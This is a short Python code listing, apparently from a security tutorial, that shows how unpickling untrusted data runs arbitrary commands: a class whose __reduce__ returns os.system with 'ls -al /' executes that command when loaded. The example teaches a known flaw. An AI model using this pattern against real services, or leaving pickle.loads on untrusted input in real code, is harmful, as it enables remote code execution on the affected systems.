# Code Listing #6

"""

Code exposing unsafe pickling of objects via a shell exploit

"""

import os
import pickle


class ShellExploit(object):
    """ A shell exploit class """
    
    def __reduce__(self):
        # this will list contents of root / folder.
        return (os.system, ('ls -al /',))


def serialize():
    shellcode = pickle.dumps(ShellExploit())
    return shellcode


def deserialize(exploit_code):
    pickle.loads(exploit_code)


if __name__ == '__main__':
    shellcode = serialize()
    deserialize(shellcode)
